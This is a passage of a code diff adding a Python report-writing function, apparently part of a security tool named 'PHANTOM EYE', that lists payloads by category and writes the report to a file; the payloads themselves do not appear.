+        lines.append(f"\n[{category.upper()}] ({len(items)} payloads)")
+        for p in items:
+            lines.append(f"  {p}")
+
+    lines.append("\n\n" + "=" * 70)
+    lines.append("End of Report - Generated by PHANTOM EYE")
+    lines.append("SYSTEM_OFFSEC")
+    lines.append("=" * 70)
+
+    content = "\n".join(lines)
+
+    with open(output_file, "w", encoding="utf-8") as f:
+        f.write(content)
+
+    print_status(f"Report written to {output_file}", "success")
+    return content
